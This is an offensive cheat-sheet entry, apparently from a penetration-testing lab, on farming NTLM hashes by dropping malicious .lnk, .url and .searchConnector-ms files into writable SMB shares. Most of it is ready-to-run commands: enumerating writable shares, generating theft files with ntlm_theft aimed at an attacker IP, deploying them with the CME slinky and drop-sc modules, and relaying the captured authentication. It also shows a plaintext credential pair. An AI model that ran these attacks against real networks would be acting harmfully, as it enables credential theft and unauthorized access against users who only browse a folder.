# 12.04 Farming Hashes via Shared Folders

> Drop `ntlm_theft`-generated icon-reference files in writable shares — Explorer auto-fetches the UNC icon and triggers NTLM.

## Overview

If poisoning is unavailable or insufficient, place malicious icon-reference files in writable SMB shares. When users browse the share, Windows Explorer auto-fetches the icon over UNC, triggering NTLM authentication to the attacker. ntlm_theft generates all file types; CME slinky and drop-sc automate deployment.

## Steps

- Find shares allowing anonymous or authenticated write access with CME
- Generate malicious files with ntlm_theft (-g all creates all types; .lnk and .url trigger on folder browse)
- Upload file via smbclient.py; prefix name with @ to sort to top
- CME slinky module creates .lnk and identifies writable shares automatically
- CME drop-sc module drops a .searchConnector-ms file that starts the WebClient service
- Run ntlmrelayx (and optionally Responder) to receive and relay the authentication

## Commands

### Find writable shares (anon)

```bash
nxc smb 172.16.117.0/24 -u anonymous -p '' --shares
```

### Generate all theft files

```bash
python3 ntlm_theft.py -g all -s 172.16.117.30 -f '@myfile'
```

### Upload lnk via smbclient

```bash
smbclient.py [email protected] -no-pass
```

### CME slinky deploy

```bash
nxc smb 172.16.117.3 -u anonymous -p '' -M slinky -o SERVER=172.16.117.30 NAME=important
```

### CME drop-sc (start WebClient)

```bash
nxc smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing SHARE=smb FILENAME=@secret
```

### Check WebDAV running

```bash
nxc smb 172.16.117.0/24 -u plaintext$ -p o6@ekK5#rlw2rAe -M webdav
```
